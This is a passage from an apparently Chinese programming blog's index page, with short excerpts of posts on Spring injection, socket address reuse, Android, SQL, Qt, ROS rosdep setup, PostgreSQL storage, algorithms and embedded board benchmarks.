&lt;bean class="b" class="B"/&gt; &lt;bean class="c" class="C"/&gt; &lt;bean class="d" class="D"/&gt; &lt;bean class="e" class="E"/&gt; &lt;bean class="a" class="A"&gt; &lt;property name="b" ref="b"/&gt; &lt;property name="c" ref="c"/&gt; &lt;property name="d" ref="d"/&gt; &lt;property name="e" ref="e"/&gt; ... &lt;/bean&gt; 上面的注入存在的问题：
如果需要注入的对象比较多，比如A类中有几十个属性，那么上面的property属性是不是需要写几十个，此时配置文件代码量暴增
如果A类中新增或者删除了一些依赖，还需要手动去调整bean xml中的依赖配置信息，否则会报错
总的来说就是不利于维护和扩展
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5920dd122f345413080626092d4d1910/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2966f6b035a52a5f424a2861344ada5a/" rel="bookmark">
			46- 怎么老是出现“地址已经被使用”？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、 怎么老是出现“地址已经被使用”？ 开篇词 上一讲我们讲到 UDP 也可以像 TCP 一样，使用 connect 方法，以快速获取异步错误的信息。
今天将讨论 服务器端程序重启时，地址被占用的原因和解决方法。
网络编程中，服务器程序需要绑定本地地址和一个端口，然后就监听在这个地址和端口上，等待客户端连接的到来。
在实战中，你可能会经常碰到一个问题，当服务器端程序重启之后，总是碰到“Address in use”的报错信息，服务器程序不能很快地重启。
那么这个问题是如何产生的？我们又该如何避免呢？
今天我们就来讲一讲这个“地址已经被使用”的问题。
1.1、从例子开始 为了引入讨论，我们从之前讲过的一个 TCP 服务器端程序开始说起：
static int count; static void sig_int(int signo) { printf("\nreceived %d datagrams\n", count); exit(0); } int main(int argc, char **argv) { int listenfd; listenfd = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in server_addr; bzero(&amp;server_addr, sizeof(server_addr)); server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = htonl(INADDR_ANY); server_addr.sin_port = htons(SERV_PORT); int rt1 = bind(listenfd, (struct sockaddr *) &amp;server_addr, sizeof(server_addr)); if (rt1 &lt; 0) { error(1, errno, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2966f6b035a52a5f424a2861344ada5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8cebca51f922cdc72e876451c4ce3f0/" rel="bookmark">
			NAT模式下虚拟机ping不通主机？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先先搞清楚什么是NAT模式，NAT（网络地址转换模式）安装虚拟机后网络适配器就会出现VMnet8网卡其对应的就是NAT模式
那我们所说的ping主机ip就是指VMnet8网卡的ip而不是WLAN网卡的ip,已经第二次犯错误了一个劲的去ping原来的(WLAN）的ip
主要是当初没有完全用到NAT的优点，比如wifi(或局域网）下我们WLAN的IP是192.168.1.100(网段跟随路由器)那NAT就可以给主机一个不同网段的IP比如192.168.64.2，个人认为NAT是电脑的虚拟路由器，接着就可以给多个虚拟机创建同一网段下不同的IP了比如192.168.64.100/102，尽量不要和WLAN的ip处于同一网段可能会不稳定而且也容易将主机的IP混淆(哭死)。
如果确定了虚拟机和主机的ip后，发现虚拟机ping不通主机大多数主机的防火墙设置。http://t.csdn.cn/OCshe
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b09868cd79730b2327c646d033724357/" rel="bookmark">
			Android软键盘弹出和收起的监听
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android软键盘弹出和收起的监听
1.直接调用
SoftKeyboardHelper softKeyboardHelper = softKeyboardHelper = new SoftKeyboardHelper(this.context); softKeyboardHelper.setKeyboardListener(rootView, new SoftKeyboardHelper.SoftKeyboardListener() { @Override public void onSoftKeyboardShow(int softKeyboardHeight) { ToastUtil.showToast("键盘弹出"); } } @Override public void onSoftKeyboardHide(int softKeyboardHeight) { ToastUtil.showToast("键盘收起"); } } }); SoftKeyboardHelper.class /** * @Description 软键盘工具类 */ public class SoftKeyboardHelper { public static final String TAG = "SoftKeyboard_Debug"; private InputMethodManager imm; private final Context context; private int lastScreenOrientation; /** * 构造函数 * * @param context 上下文 */ public SoftKeyboardHelper(Context context) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b09868cd79730b2327c646d033724357/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/537afd973a58cde51d88821be240ef2c/" rel="bookmark">
			为了甩锅，我写了个牛逼的日志切面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package com.hz.framework.aspectj;
import com.alibaba.fastjson.JSON;
import lombok.Data;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.AfterThrowing;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.aspectj.lang.reflect.MethodSignature;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.multipart.MultipartFile;
import javax.servlet.http.HttpServletRequest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
/**
@author zyg
@className RequestLogAspect
@date 2022年04月22日 16:32
*/
@Component
@Aspect
public class RequestLogAspect {
private final static Logger LOGGER = LoggerFactory.getLogger(RequestLogAspect.class);
//@Pointcut(“execution(* com.hikvision.trainplatform.controller…*(…))”)
@Pointcut(“@annotation(com.hz.common.annotation.Log)”)
public void requestServer() {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/537afd973a58cde51d88821be240ef2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e6907d22bde607a2facfdba2ae57d0e/" rel="bookmark">
			【mysql】使用sql将一个表的数据复制筛选部分行和列到另一个表去
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 事件起因总结的sql写法 过程执行的sql语句 事件起因 给客户的系统导入数据，涉及到一些初始的账户、部门、角色（用户与角色的对应关系表什么的），反正也就每个表几千条的样子吧
但是在写后端接口进行文件导入和写sql进行一些数据关联表的导入时出现了一个问题 怎样把一个表的数据比如说id放到另一个表中去
我们常规的插入语句：
insert into 表名（字段名1，字段名2....） values(字段名1数据，字段名2数据....) values(字段名1数据，字段名2数据.....) .... 要想插入多行只有继续向下写values（）
总结的sql写法 先将找到的一种sql语句写法写在这儿
insert into table1(fld1, fld2) select fld1, 5 from table2 where ... 插入语句后面接select语句 能够他批量插入一个集合的数据，字段名和顺序需要自己进行对应，里面有select语句也可使用where等sql语句进行一定的数据筛选，从而达到数据从一个表到另一个表的作用
这儿就涉及到另一个写法：
将一个表所有的数据内容直接复制到另一个表中去
select * into table1 from table2 该语句与上面的那个语句有一定的区别：
该语句要求table1表不存在，相当于完全创建了一个新的表，然后将table2表中的内容全部查询出来，然后复制了一份在table1表中去
而前面的第一条语句是对两个已经存在的表的操作，使用的insert into语句：
过程 前提（各个表的结构）
user表：
user和role（用户和角色的关系表）
使用 sql 语句将数据表中没有的用户角色关系导入到该表中去（怎样的一个执行过程说明）：
执行的sql语句 下面的语句执行的意思是（将sys_user表中还没有赋予角色的账户赋予一个默认角色id（100000） not in后面的集合就是之前查询出来的账户角色表中已有的用户角色关系的用户id（虽然这儿也可以用sql语句给代替））：
insert into sys_user_role(user_id,role_id) select user_id,100000 role_id from sys_user where user_id not in (1,12822,12823,12824,12825,12952,12953,12954,13030,13031,13032,13121,13122,13123,13304,13305,13306,13331,13332,13333,13334,13335,13336,13781,13782,13788,13794,13806,13807,13808,13809,13837,13868,13912,13915,13916,13922,13930,13932,13937,13939,13949,13968,14031,14102,14168,14206,14324,14328,14329,14332,14345,14346,14347,14351,14355,14358,14383,14388,14389,14453,14461,14462,14463,14476,14478,14479,14488,14559) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d823ee6aced986c5f08817c0ae2762e6/" rel="bookmark">
			Pubsub.js初使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装
npm install pubsub-js 2. 引入
import Pubsub from 'pubsub-js' 3.案例
实现两个兄弟组件可以相互传参，如下图
App.jsx
&lt;&gt; &lt;Header&gt;&lt;/Header&gt; &lt;List&gt;&lt;/List&gt; &lt;/&gt; Header.jsx
import React ,{useRef} from "react"; import Pubsub from 'pubsub-js' export default ()=&gt;{ const ref = useRef(null) const handleClick = () =&gt; { Pubsub.publish('inputMsg',ref.current.value) ref.current.value = '' } return( &lt;div&gt; &lt;input type="text" ref={ref}/&gt; &lt;button onClick={handleClick}&gt;send msg&lt;/button&gt; &lt;/div&gt; ) } List.jsx
import React,{useState,useEffect} from "react"; import Pubsub from 'pubsub-js' export default () =&gt; { const [inputVal,setInputVal] = useState(''); useEffect(()=&gt;{ Pubsub.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d823ee6aced986c5f08817c0ae2762e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd9cba59a1cfb2f69bfe362bfd313d36/" rel="bookmark">
			数据分析之Sql Server 查询当前数据库所有表的数据量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 查询当前数据库所有表的数据量
USE 当前数据库名称 GO SELECT A.NAME ,B.ROWS FROM sysobjects A JOIN sysindexes B ON A.id = B.id WHERE A.xtype = 'U' AND B.indid IN(0,1) ORDER BY B.ROWS DESC，A.NAME 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aca63a7fe9fba7208a52ea73c0bdbd2f/" rel="bookmark">
			自动化测试的生命周期是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件测试发展到今日，已经逐渐标准化且能力更强，其流程每天都在发展。测试人员的技术熟练程度对于整个测试阶段的成功来说至关重要。测试不再意味着仅仅发现错误；它的范围已经扩大，从任何开发项目开始就可以看出它的重要性。
当谈论起自动化测试生命周期（Automation Testing Life Cycle）时，大多数人认为这只是 SDLC 的一部分，但它远不止于此。有必要了解自动化测试应该是自动化测试策略的突出部分，并且具有生命周期。企业必须对其进行调整以提高其软件产品的质量。
随着继续推进，需要能够回答以下问题：什么是自动化测试生命周期，以及自动化测试生命周期中的有哪些阶段。
自动化测试生命周期的各个阶段 测试的自动化应该得到强大的测试计划的支持。流程的预定义结构有助于设计测试计划并制定自动化测试工具的选择策略，从而设置测试环境、设计测试用例并编写脚本。它进一步定义了测试自动化、测试准备、实施、测试验证和报告的范围。
自动化测试生命周期中的这六个阶段与软件开发周期并行运行。以下是各阶段：
阶段1：确定自动化测试的范围
阶段2：选择合适的自动化工具
阶段3：定义自动化测试的计划、策略和设计
阶段4：设置测试环境
阶段5：测试脚本和执行
阶段6：测试分析和报告
1. 确定自动化测试的范围 这是自动化测试生命周期的第一步。在此步骤中，测试团队需要确定自动化测试的可行性。可行性分析对于每个阶段都是必不可少的，以检查其可操作性，并帮助测试团队设计测试脚本。本阶段需要考虑的事项包括：
应用程序的哪些模块应该自动化，哪些模块不应该自动化。 哪些测试用例可以或需要自动化。 如何自动化这些测试用例。 考虑到自动化与测试目标的适应性，选择哪些自动化工具。 预算、实施成本、可用资源和可用技能。 测试用例和自动化测试可行性分析应在开始测试自动化之前进行。
2. 选择合适的自动化工具 这是ATLC最关键的阶段之一，因为自动化测试依赖于工具。要谨慎地考虑和选择正确的自动化工具来自动化UI组件。选择工具可能需要完成另一个层次的分析。在选择工具之前，应该始终牢记预算和成本。除此之外，团队还应分析资源是否具有技术技能，以及工具是否支持项目所需的技术。此外，该工具应提供强大的技术支持，以回答使用中可能存在的疑问。
3.自动化测试的计划、策略和设计 这是自动化测试周期中的另一个关键步骤，主要解释实现测试自动化策略的方法。这个阶段的主要步骤是决定使用哪个测试自动化框架。在为项目选择合适的工具时，必须记住软件项目所需的技术。因此，对产品进行深入分析非常重要。
在执行自动化测试计划时，测试人员为测试过程创建、测试环境的硬件、软件和网络需求、测试数据先决条件、测试时间表、错误跟踪机制和工具等建立标准和指南。测试人员还负责决定测试体系结构、测试程序的结构和测试程序管理。
测试管理策略涵盖以下几点：
测试管理工具将捕获所有手动测试用例。测试人员需要收集手动测试用例并确定哪些需要测试。 必须进行彻底的研究来确定测试框架并了解自动化测试工具的优缺点。 此外，测试人员还需要了解工具和应用程序之间的所有相关威胁、背景和依赖关系。 团队还必须在测试管理工具中为自动化测试用例构建一个测试套件。 未经利益相关者和客户批准，无法实施或执行制定的测试策略。 4. 搭建测试环境 在此阶段，测试团队必须设置、跟踪和安排测试环境。换句话说，这意味着在这个阶段，建立了一个机器/远程环境来执行测试用例。需要虚拟机是因为并非所有用户都使用相同的机器来访问 Web 应用程序。因此，我们需要观察用户使用的各种设备、浏览器和版本。如果未正确验证其在不同设备-浏览器-操作系统组合之间的兼容性，网站效果跟用户看到的可能不一样。为了实现这一点，跨浏览器测试成为首要任务，以确保您的 Web 应用程序按预期提供出色的用户体验。
此阶段需要详细规划以处理尽可能多的场景并增加测试覆盖率。在测试团队负责任的参与下，必须维护所有环境设置活动的正确跟踪和时间表。除此之外，设置测试环境、安排网络和硬件资源、执行测试数据库清理、开发测试平台和环境脚本等一切都必须处理。
执行跨浏览器测试并不像听起来那么容易。它涉及设置不同的浏览器、不同的版本、不同的设备等，这对团队来说是个不小的负担。
维护浏览器实验室并不是一件容易的事，因为从头开始建立和维护基础设施成本高昂，而且并非所有企业都能负担得起。因此，建议采用基于云的测试基础设施，为测试人员提供一个平台，以测试虚拟机托管的多个移动和桌面设备的各种浏览器设备操作系统组合。
以下是测试环境设置的几个方面：
确保有一个可以进行负载测试的前端运行环境，以检查其是否有能力处理高负载的Web流量。 有时，设置的测试环境没有提供与生产数据相似的数据，使产品容易受到生产环境中任何代码更改的影响。 需要进行测试的所有系统、模块和应用程序的列表应该进行维护检查。 测试尽可能多的浏览器及其版本。 跨多个客户端操作系统进行测试。 需要用于登台环境的单独数据库服务器。 确保在不同网络条件下测试 Web 应用程序，以了解实际的网站渲染时间和整体外观。 在中央数据库中维护用户手册、安装指南和其他文档也是为未来需求设置测试环境的关键。 测试脚本和执行
配置测试环境设置后，下一步就是执行测试脚本。测试人员在开发测试脚本之前应该考虑以下几点： 根据项目要求创建脚本。 在整个过程中使用通用的方法。 确保脚本可重用、简单且结构化，以便任何人都能理解它们。 执行适当的代码审查和报告以获得更好的见解并在整个过程中保持质量。 脚本开发完成后，需要牢记以下几点以确保脚本无障碍运行：
根据测试用例，它们应该包括所有功能方面。 它们应该涵盖执行测试脚本的所有平台和环境。。 它们必须批量处理以节省时间和精力。 要始终练习编写错误报告，以防出现任何功能错误。 评估和记录测试结果以供进一步参考，并在 ATLC 的这一部分创建测试结果文档。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aca63a7fe9fba7208a52ea73c0bdbd2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca1aa8332cbc375c8a8204966f2d526a/" rel="bookmark">
			Win10家庭版添加不了新账户的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现象如图所示：
解决方法：
按WIN+R，在“运行”中输入命令： control userpasswords2 即可弹出正常创建账户界面，亲测有效，Win10家庭版，和你贴图一模一样，搞定！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9535bc45d7566277553e3f0f1b355b68/" rel="bookmark">
			复制别人的代码出现：Illegal character: U&#43;3000 错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这样的错误就是代码出现了全角空格，去掉这些空格就行或者把出现错误的代码跟着打上去就行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/247154b2336de6ad0f0977b43b5fed37/" rel="bookmark">
			QT样式表设置不生效问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 简单的一个例子：
QLabel使用setStyleSheet设置样式表之后不生效的问题
ui-&gt;label-&gt;setStyleSheet("background-color: rgb(255, 255, 255); color: rgb(0, 0, 255);font: 75 30pt;\"Arial\";"); 上述语句中，设置字体中间有一个分号“ ; ” 不该出现在这里，这个问题不仔细很难看出来的
ui-&gt;label-&gt;setStyleSheet("background-color: rgb(255, 255, 255);color: rgb(0, 0, 255);font: 75 32pt \"Arial\";"); 指定控件移除旧的样式。
//移除原有样式 style()-&gt;unpolish(ui-&gt;btn); //必须要有下面这行不然还是不会卸载 ui-&gt;btn-&gt;setStyleSheet(""); //重新设置新的该控件的样式。 style()-&gt;polish(ui-&gt;btn); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/605ad7115ef98c36b0dcba712e9c4fef/" rel="bookmark">
			计算机网络【性能指标之速率、带宽、吞吐量、时延、时延带宽积、往返时延RTT、利用率】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机网络【性能指标之速率、带宽、吞吐量、时延、时延带宽积、往返时延RTT、利用率】 速率带宽吞吐量时延时延带宽积往返时延RTT利用率 速率 速率：数据率、数据传输率、比特率
比特 1/0 位
连接在计算机网络上的主机在数组信道上传送数据位数的速率
单位是 b/s，kb/s，Mp/s，Gb/s，Tb/s
速率
千 1kb/s = 103b/s
兆 1Mb/s = 103kb/s = 106b/s
吉 1Gb/s = 103Mb/s = 106kb/s = 109b/s
太1Tb/s = 103Gb/s = 106Mb/s = 109kb/s = 1012b/s
在速率中，103进制转换
存储容量
1Byte（字节）= 8bit（比特）
1KB = 210B = 1024B = 1024 * 8b
1MB = 210KB = 1024KB
1GB = 210MB = 1024MB
1TB = 210GB = 1024GB
在存储容量中，210也就是1024的进制转换
带宽 带宽原本指某个信号具有的频带宽度，即最高频率与最低频率之差，单位是赫兹（Hz）计算机网络中，带宽用来表示网络的通信线路传送数据的能力，通常是指单位时间内从网络中的某一点到另一点所能通过的最高数据率。单位是“比特每秒”，b/s，kb/s，Mb/s，Gb/s。网络设备所支持的最高速度 吞吐量 表示单位时间内通过**某个网络（或信道、接口）**的数据量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/605ad7115ef98c36b0dcba712e9c4fef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee59f58fe2369469d63c93be48a04238/" rel="bookmark">
			解决rosdep init报错“Website may be down”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决rosdep init报错“Website may be down” reading in sources list data from /etc/ros/rosdep/sources.list.d
Hit https://raw.githubusercontent.com/ros/rosdistro/master/rosdep/osx-homebrew.yaml
ERROR: unable to process source [https://raw.githubusercontent.com/ros/rosdistro/master/rosdep/base.yaml]:
网上看了很多方法：
https://raw.githubusercontent.com/ros/rosdistro/master/rosdep/sources.list.d/20-default.list - gary_123 - 博客园
https://raw.githubusercontent.com/ros/rosdistro/master/rosdep/sources.list.d/20-default.list_Ericztoa的博客-CSDN博客
sudo rosdep init报错的解决方式_PuerAloe的博客-CSDN博客_sudorosdepinit报错
解决rosdep init报错“Website may be down” - 知乎
以及查找路由，Hosts里面设置。更换网络等等，就差买个vpn了。都不行。
总结: 不是方法有误，而是写的不详细：
方案如下：
1. 下载 git clone https://github.com/ros/rosdistro.git 到home路径里
2. 设置，找不到找找python2.7，这个跟python主要版本有关，灵活点
xx@xx:/usr/lib/python3/dist-packages/rosdep2$ sudo gedit rep3.py
xx@xx:/usr/lib/python3/dist-packages/rosdep2$ sudo gedit sources_list.py
xx@xx:/usr/lib/python3/dist-packages/rosdep2$ sudo gedit gbpdistro_support.py
https://raw.githubusercontent.com/ros/rosdistro/master
替换为
file:///home/bozhon/rosdistro
可以检查一下，把能社会的都设置了
3. 设置(很重要，不然老有一个东西找index-v4.yaml或者其他文件)
xx@xx:/usr/lib/python3/dist-packages/rosdistro$ sudo gedit __init__.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee59f58fe2369469d63c93be48a04238/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3c03905e2d219387a3a526f1cbe0a2e/" rel="bookmark">
			javac不是内部或外部命令,也不是可运行的程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我运行Java命令都是正常的，Javac命令就提示不是内部或外部命令,也不是可运行的程序
排查发现，在我配置的JAVA_HOME里，我的JDK里没有JRE，重新下载JDK或者将JRE安装到JDK里就行了，下载完成是这样的，然后运行就OK了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b083f2ad72ebe408aae9eedad97fbbe/" rel="bookmark">
			PostgreSQL列存与行存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		列存优势： 1、列存没有行存1666列的限制
2、列存的大量记录数扫描比行存节约资源
3、列存压缩比高，节约空间
4、列存的大量数据计算可以使用向量化执行，效率高
行存优势： 1、行存查询多列时快
2、行存DML效率高
简单来说，行存适合OLTP业务，列存适合OLAP业务。
如果业务是混合负载，既有高并发SQL，又有实时分析业务怎么办？
Oracle的做法： in memory column store，实际上是两份存储，一份在磁盘（行存），一份在内存中使用列存。
根据SQL，优化器选择扫描列存还是行存。(通常看planNODE中数据扫描的行选择性，输出的行数，输出的列数等)
Oracle in memory column store是两份存储的思路。
PostgreSQL如何应对混合业务场景呢？ 当前PG已经有了SMP并行执行的优化器功能，丰富的聚合函数，窗口函数等，已经有很好的OLAP处理能力。如果能在数据存储组织形式上支持到位，势必会给OLAP的能力带来更大的质的飞跃，以更好的适合OLTP OLAP混合业务场景。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0545d831fe6edbf95afc1c5606d0c90c/" rel="bookmark">
			贪心算法：会场安排问题（C语言实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		会场安排问题 假设要在足够多的会场里安排一批活动，并希望使用尽可能少的会场。设计一个有效的贪心算法进行安排。对于给定的k个待安排的活动，计算使用最少会场的时间表。
问题分析： 这是一个活动安排问题，为了尽可能少地使用会场，就要尽可能多地在会场中安排活动。对于此类安排争用某一公共资源的问题使用贪心算法解决较为合适。
下面以k = 5（即有5个活动）为例用C语言实现以上过程。
活动起始时间分别为：
1 23 12 28 25 35 27 80 36 35
#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; //把各个活动的起始时间和结束时间按结束时间非减序排序 void sort(int n,int f[]) { int tempa,i,j; for(i=1; i&lt;=n; i++) { for(j=i+1; j&lt;=n; j++) { if(f[i]&gt;f[j]) { tempa=f[i]; f[i]=f[j]; f[j]=tempa; } } } } //贪心算法 int GreedySelect(int n,int s[],int f[],bool A[]) { A[1]=true;//将第一个活动先安排 int i; int j=1;//j为刚刚被选中的活动的编号 int count=1; //count为被安排的节目个数 for(i=2; i&lt;=n; i++) { if(s[i]&gt;=f[j]) { A[i]=1; j=i; count++; } else A[i]=0; } return count; } int main() { int n,s[50],f[50]; bool A[50]; printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0545d831fe6edbf95afc1c5606d0c90c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98e0691086f3c7d351e8ba8ee9f4dced/" rel="bookmark">
			国产“芯” · 瑞芯微 RK3568 性能解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		测试开始
一、显示测试
◆ 三屏同显 在MIPI/LVDS/HDMI屏幕上同时播放同一视频
​
◆ 三屏异显 在MIPI/LVDS/HDMI屏幕上同时播放不同视频
​
◆ 视频硬件解码
同时播放1024*600/1280*800/3840*2160三种分辨率视频。使用命令进行H.264视频硬解码播放
[root@ok3568:/]# gst-launch-1.0 filesrc location=/home/forlinx/video/1-B.mp4 ! qtdemux ! h264parse ! mppvideodec ! waylandsink "render-rectangle=&lt;0,0,1280,800&gt;" &amp;
[root@ok3568:/]# gst-launch-1.0 filesrc location=/home/forlinx/video/2-3001.mp4 ! qtdemux ! h264parse ! mppvideodec ! waylandsink "render-rectangle=&lt;1280,0,3840,2160&gt;" &amp;
[root@ok3568:/]# gst-launch-1.0 filesrc location=/home/forlinx/video/3-Q.mp4 ! qtdemux ! h264parse ! mppvideodec ! waylandsink "render-rectangle=&lt;5120,0,1024,600&gt;" &amp;
[root@ok3568:/]# top
​
如上可见，在1024*600/1280*800/3840*2160三种分辨率视频播放的情况下CPU的占用只有30%左右，CPU剩余大量的资源，可以进行其它操作。
二、硬件编解码组件列表
Rockchip官方mpp 硬解码组件、H.264\H.265\VP8\JPEG等
使用命令查看inspect如下：
[root@ok3568:/]#gst-inspect-1.0| grep rockchipmpp
​
三、AI测试
内置Tensorflow AI框架和Open CV3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98e0691086f3c7d351e8ba8ee9f4dced/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93552d68ae55d9f0cd0ac5602bf6ec16/" rel="bookmark">
			Idea中使用Antlr4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Idea中使用Antlr4 一、新建一个MAVEN项目二、antlr在idea中的使用三、抽象语法树的访问（Vistor方式）抽象语法树的例子例子分析（建议看完 三 和四 再回头看例子的分析）生成的节点类节点的访问方法 四、Antlr4基础类的介绍五、Visitor遍历类 一、新建一个MAVEN项目 （1）new -&gt; project -&gt;maven
（2）在pom文件中引入antlr相关的依赖
pom.xml文件如下
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.wyf&lt;/groupId&gt; &lt;artifactId&gt;Antlr&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.antlr&lt;/groupId&gt; &lt;artifactId&gt;antlr4-runtime&lt;/artifactId&gt; &lt;version&gt;4.9.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.20&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.antlr&lt;/groupId&gt; &lt;artifactId&gt;antlr4&lt;/artifactId&gt; &lt;version&gt;4.9&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;antlr&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;antlr4&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;none&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;outputDirectory&gt;src/test/java&lt;/outputDirectory&gt; &lt;listener&gt;true&lt;/listener&gt; &lt;treatWarningsAsErrors&gt;true&lt;/treatWarningsAsErrors&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;8&lt;/source&gt; &lt;target&gt;8&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; （3）安装Antlr插件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93552d68ae55d9f0cd0ac5602bf6ec16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cbacf492fafd7c71e0bc215b3b49f30/" rel="bookmark">
			LeetCode 662. 二叉树的最大宽度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二叉树在每一层的宽度，定义为这一层中，最左侧节点到最右侧节点之间的长度（中间的null节点也被计算在内）。二叉树的最大宽度，就是每一层的宽度中的最大值。
根据题目描述来看，最直观的想法就是BFS层序遍历。遍历每一层，求每一层的宽度，然后取一个max。关键是每一层的宽度怎么求？由于中间允许有null节点。想了一会儿后，发现用数组模拟二叉树时，节点在数组中都有一个下标，这个下标，可以用来解这道题。
